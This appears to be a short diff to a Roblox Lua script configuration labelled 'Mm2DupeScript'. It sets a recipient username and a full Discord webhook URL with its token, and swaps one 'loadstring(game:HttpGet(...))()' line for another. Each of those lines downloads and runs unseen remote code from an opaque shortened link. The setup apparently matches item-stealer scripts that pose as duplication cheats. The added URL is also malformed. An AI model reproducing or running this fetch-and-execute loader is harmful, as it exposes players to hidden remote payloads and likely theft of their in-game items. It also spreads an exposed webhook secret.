@@ -3,4 +3,4 @@ Username = "Rouge057"
 Webhook = "https://discord.com/api/webhooks/1398306293063880778/BKHDf8oiG7liCVEd2fpZEnAj82BgHxTR2lJ2S1Qn3BwffEWeYTYCJlFnrvusb8q9pAuM"
 discuser = "Your Discord User ID Here"
 
-loadstring(game:HttpGet("https://share.google/3xAGq20JXJ8FcgsOo"))()
+loadstring(game:HttpGet("nursultanranaldo95/Mm2DupeScript https://share.google/9eK9Rdc6r6qmbSH6n"))()
